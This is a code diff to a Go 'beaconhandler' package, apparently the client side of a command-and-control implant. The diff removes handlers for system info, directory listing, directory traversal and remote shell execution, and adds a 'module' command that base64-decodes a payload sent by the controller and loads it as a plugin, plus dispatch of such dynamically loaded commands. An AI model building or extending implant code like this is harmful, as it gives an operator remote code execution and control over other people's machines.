@@ -1,15 +1,63 @@
 package beaconhandler
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"strings"
 
 	httpFuncs "src/Client/beacon/http"
-	"src/Client/generic/commands"
 	"src/Client/generic/config"
 	"src/Client/generic/logger"
+	"src/Client/generic/rpc_client"
 )
+
+// commandHandlerFunc defines the signature for command handlers.
+type commandHandlerFunc func(httpFuncs.CommandData, string) (string, bool)
+
+// handlers holds all command handlers, including dynamically added modules.
+var handlers = make(map[string]commandHandlerFunc)
+
+// ModuleData is the expected structure for the 'module' command's data.
+type ModuleData struct {
+	Name string `json:"name"`
+	Data []byte `json:"data"`
+}
+
+// init registers built-in command handlers.
+func init() {
+	handlers["session"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+		logger.Log("switching to 'session' mode")
+		return "ack", true
+	}
+	handlers["update"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+		logger.Log("Processing 'update' command.")
+		return handleUpdateCommand(cmd.Data), false
+	}
+	// module loader remains special case
+	handlers["module"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+		logger.Log("Loading dynamic content for 'module' command.")
+
+		var moduleData struct {
+			Name string `json:"name"`
+			Data string `json:"data"`
+		}
+		if err := json.Unmarshal(cmd.Data, &moduleData); err != nil {
+			logger.Error(fmt.Sprintf("Failed to unmarshal module command data: %v. Data: %s", err, string(cmd.Data)))
+			return "Error: Malformed data for 'module' command: " + err.Error(), false
+		}
+		decodedData, err := base64.StdEncoding.DecodeString(moduleData.Data)
+		if err != nil {
+			logger.Error(fmt.Sprintf("Failed to base64 decode module data: %v", err))
+			return "Error: Failed to base64 decode module data: " + err.Error(), false
+		}
+		if err := rpc_client.LoadDynamicCommandFromBeacon(moduleData.Name, decodedData); err != nil {
+			logger.Error(fmt.Sprintf("Failed to load %s plugin: %v", moduleData.Name, err))
+			return fmt.Sprintf("Error loading module %s: %v", moduleData.Name, err), false
+		}
+		return fmt.Sprintf("Module %s loaded successfully", moduleData.Name), false
+	}
+}
 
 // executeCommand dispatches a single command to the appropriate handler and returns its report and a bool on whether
 // to switch to session mode.
@@ -29,48 +77,17 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 	logger.Log(fmt.Sprintf("Executing command: '%s' (uuid: %s)", command.Command, command.CommandUUID))
 	var outputMsg string
 
-	// Define a map of command handlers for easier extensibility.
-	type commandHandlerFunc func(httpFuncs.CommandData, string) (string, bool)
-	handlers := map[string]commandHandlerFunc{
-		"session": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("switching to 'session' mode")
-			return "ack", true
-		},
-		"update": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("Processing 'update' command.")
-			return handleUpdateCommand(cmd.Data), false
-		},
-		"systeminfo": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("Processing 'systemInfo' command.")
-			return commands.SysInfoString(), false
-		},
-		"list_dir": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("Processing 'listDirectory' command.")
-			return commands.ListDirectoryBeacon(data), false
-		},
-		"directory_traversal": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("Running a directory traversal")
-			return commands.DirectoryTraversalBeacon(data), false
-		},
-		"shell": func(cmd httpFuncs.CommandData, data string) (string, bool) {
-			logger.Log("Processing 'shell' command.")
-			if data == "" {
-				logger.Error("Shell command received with empty data.")
-				return "Error: No shell command provided.", false
-			}
-			output, err := commands.BeaconShellCommand(data)
-			if err != nil {
-				logger.Error(fmt.Sprintf("Shell command execution failed: %v", err))
-				return "Error: " + err.Error(), false
-			}
-			logger.Log(fmt.Sprintf("Shell command executed successfully: %s", output))
-			return output, false
-		},
-	}
 	var switchSession bool
 	handler, exists := handlers[command.Command]
 	if exists {
 		outputMsg, switchSession = handler(command, commandData)
+	} else if rpc_client.HasCommand(command.Command) {
+		logger.Log(fmt.Sprintf("Executing dynamic command: '%s'", command.Command))
+		var err error
+		outputMsg, err = rpc_client.ExecuteFromBeacon(command.Command, []string{}, commandData)
+		if err != nil {
+			outputMsg = fmt.Sprintf("Error executing %s: %v", command.Command, err)
+		}
 	} else {
 		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
 		outputMsg = handleGenericCommand(command)
